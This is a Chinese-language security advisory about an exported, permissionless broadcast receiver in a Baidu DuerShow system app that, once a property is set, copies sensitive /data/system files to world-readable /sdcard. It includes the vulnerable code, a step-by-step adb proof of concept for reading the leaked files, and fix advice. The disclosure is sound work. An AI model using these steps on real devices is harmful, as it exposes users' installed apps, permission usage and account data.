# V14 — `SystemLogRequestReceiver` 系统日志/配置外泄至 sdcard

| 项 | 值 |
|----|----|
| **严重性** | 🟠 高（受前置条件限制）|
| **CWE** | CWE-862 / CWE-200 Exposure of Sensitive Information |
| **受影响应用** | `com.baidu.duershow.statistic` (/system/priv-app) |
| **UID** | **1000** |
| **组件** | `com.baidu.duershow.statistic.receiver.SystemLogRequestReceiver` |
| **exported** | `true` |
| **permission** | **无** |
| **前置条件** | `persist.sys.baidu.copy.data.system.logs == 1` |
| **实机验证** | 广播可达 ✅；任务执行受限 |

---

## 1. 摘要

该 receiver 导出且无权限。若系统属性
`persist.sys.baidu.copy.data.system.logs` 等于 `1`，它会启动
`DataSystemFileCollectTask`，以 **system UID** 把多个敏感系统文件复制到
`/sdcard/.log/`，任何应用都能读取。

## 2. 漏洞代码

```java
// SystemLogRequestReceiver
public void onReceive(Context context, Intent intent) {
    if (!"android.intent.action.ACTION_SYSTEM_LOG_REQUEST"
            .equals(intent.getAction())) return;

    int i = SystemProperties.getInt(
            "persist.sys.baidu.copy.data.system.logs", 0);
    if (i != 1) {                      // START_DUMP_PID_LOG_NUM
        LogUtil.e(TAG, "copySystemLogs, status error " + i);
        return;
    }
    new Thread(new DataSystemFileCollectTask()).start();
}

// DataSystemFileCollectTask
private void copySystemFiles() {
    File dst = new File("/sdcard/.log/");
    dst.mkdirs();

    File dropbox = new File("/data/system/dropbox");
    for (File f : dropbox.listFiles()) {
        FileUtils.copyFile(f, new File(dst, "dropbox/" + f.getName()));
    }
    FileUtils.copyFile(new File("/data/system/packages.xml"),
                       new File(dst, "packages.xml"));
    FileUtils.copyFile(new File("/data/system/packages.list"),
                       new File(dst, "packages.list"));
    FileUtils.copyFile(new File("/data/system/appops.xml"),
                       new File(dst, "appops.xml"));

    File users = new File("/data/system/users/0/");
    for (File f : users.listFiles()) {
        FileUtils.copyFile(f, new File(dst, "users/" + f.getName()));
    }
}
```

## 3. 泄露内容

| 源文件 | 敏感信息 |
|--------|---------|
| `/data/system/dropbox/*` | 应用崩溃栈、ANR 轨迹、可能含 PII |
| `packages.xml` | **完整已装应用清单、签名、权限、安装时间** |
| `packages.list` | 应用 UID / 数据目录映射 |
| `appops.xml` | **各应用的权限使用记录**（谁用过相机/麦克风/定位）|
| `users/0/*` | 用户配置、账户相关元数据 |

这些数据足以支撑一次完整的**设备画像**（有哪些应用、谁在偷权限、崩溃史）。

## 4. 复现

```bash
# 1) 发送广播（已验证可达，但属性未置 1 会被拒）
adb shell am broadcast \
  -a android.intent.action.ACTION_SYSTEM_LOG_REQUEST \
  -n com.baidu.duershow.statistic/com.baidu.duershow.statistic.receiver.SystemLogRequestReceiver

# 2) 前置：把属性置 1（需 root / 或由已授权的系统组件设置）
adb shell setprop persist.sys.baidu.copy.data.system.logs 1

# 3) 再次发送广播，触发复制
adb shell am broadcast -a android.intent.action.ACTION_SYSTEM_LOG_REQUEST \
  -n com.baidu.duershow.statistic/com.baidu.duershow.statistic.receiver.SystemLogRequestReceiver

# 4) 读取泄露数据（任意应用可读）
adb shell ls -l /sdcard/.log/
adb shell cat /sdcard/.log/packages.list | head
```

**实测**：属性未设置时任务被拒（日志 `status error 0`），设备无副作用。
普通应用无法写 `persist.sys.*`（`setprop` 返回权限错误）。

> 若结合 V11/V12 等具备 system UID 属性写入能力的组件，即可打通整条链。

## 5. 修复建议

```xml
<receiver android:name="...SystemLogRequestReceiver"
          android:exported="false"
          android:permission="com.baidu.duershow.permission.SERVICE" />
```

另外：

- 不要把系统文件复制到 `/sdcard`（全局可读），改用应用私有目录
- 复制前校验调用方 UID
- 属性仅作开关，不应作为唯一鉴权手段
